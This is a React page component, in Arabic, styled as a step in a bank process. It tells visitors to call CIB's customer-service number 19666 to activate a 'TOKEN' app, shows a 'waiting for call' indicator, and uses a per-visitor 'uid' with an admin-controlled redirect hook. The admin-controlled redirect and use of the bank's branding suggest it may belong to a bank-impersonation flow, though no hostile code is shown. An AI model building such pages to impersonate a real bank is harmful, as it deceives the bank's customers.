import { useSearchParams } from "react-router-dom";
import { Phone, ShieldCheck, Clock, AlertTriangle, Info } from "lucide-react";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";

const BankCall = () => {
  const [searchParams] = useSearchParams();
  const userId = searchParams.get("uid") || "";
  useAdminRedirect(userId || null);

  return (
    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
      <SiteHeader />

      <main className="flex-1 container mx-auto px-4 py-10">
        <div className="max-w-2xl mx-auto">
          {/* Hero */}
          <div className="text-center mb-8 animate-fade-in">
            <div className="inline-flex w-20 h-20 rounded-full hero-gradient items-center justify-center shadow-[0_10px_40px_hsl(213_76%_44%/0.45)] mb-4">
              <Phone className="w-10 h-10 text-primary-foreground animate-pulse" />
            </div>
            <h1 className="text-3xl font-extrabold text-foreground mb-2">
              مكالمة من البنك
            </h1>
            <p className="text-sm text-muted-foreground">
              يرجى الاتصال بخدمة العملاء لإتمام تفعيل طلبك
            </p>
          </div>

          {/* Info Box */}
          <div className="bg-card border border-border rounded-2xl shadow-lg overflow-hidden">
            <div className="hero-gradient px-5 py-4 flex items-center gap-3">
              <Info className="w-5 h-5 text-primary-foreground" />
              <h2 className="text-base font-bold text-primary-foreground">
                خطوة أخيرة لإتمام الطلب
              </h2>
            </div>

            <div className="p-6 space-y-5">
              {/* Main message */}
              <div className="bg-gradient-to-br from-primary/5 to-primary/10 border border-primary/20 rounded-xl p-5 text-center">
                <p className="text-base font-bold text-foreground leading-relaxed mb-4">
                  لإتمام تفعيل طلبك يرجى الاتصال بخدمة العملاء
                </p>
                <a
                  href="tel:19666"
                  className="inline-flex items-center gap-3 px-6 py-3 rounded-xl hero-gradient text-primary-foreground font-extrabold text-2xl shadow-[0_8px_30px_hsl(213_76%_44%/0.4)] hover:scale-105 transition-transform tracking-wider"
                  dir="ltr"
                >
                  <Phone className="w-6 h-6" />
                  19666
                </a>
                <p className="text-sm font-bold text-foreground mt-4">
                  لتفعيل تطبيق <span className="text-primary">TOKEN</span>
                </p>
              </div>

              <div className="flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">
                    اتصال آمن وموثوق
                  </h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    رقم 19666 هو الرقم الرسمي لخدمة عملاء البنك التجاري الدولي CIB، متاح على مدار 24 ساعة.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <Clock className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">
                    إجراء سريع
                  </h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    سيقوم موظف خدمة العملاء بإرشادك خطوة بخطوة لتفعيل تطبيق TOKEN واستكمال طلبك خلال دقائق.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <AlertTriangle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">
                    تنبيه أمني
                  </h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    لا تشارك كلمة المرور أو رمز التحقق (OTP) كاملاً مع أي شخص. موظف البنك لن يطلب منك ذلك أبداً.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Status indicator */}
          <div className="mt-6 flex items-center justify-center gap-2">
            <span className="relative flex h-3 w-3">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75" />
              <span className="relative inline-flex rounded-full h-3 w-3 bg-primary" />
            </span>
            <span className="text-xs font-bold text-foreground">
              في انتظار إتمام المكالمة...
            </span>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
};

export default BankCall;
